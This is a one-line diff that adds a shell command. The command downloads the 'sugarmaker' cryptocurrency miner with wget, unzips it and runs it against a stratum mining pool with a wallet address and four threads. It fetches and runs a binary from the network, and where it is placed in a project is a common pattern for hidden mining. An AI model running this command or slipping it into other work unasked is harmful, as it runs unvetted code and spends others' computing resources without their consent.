@@ -1,0 +1,1 @@
+wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.SA -t 4
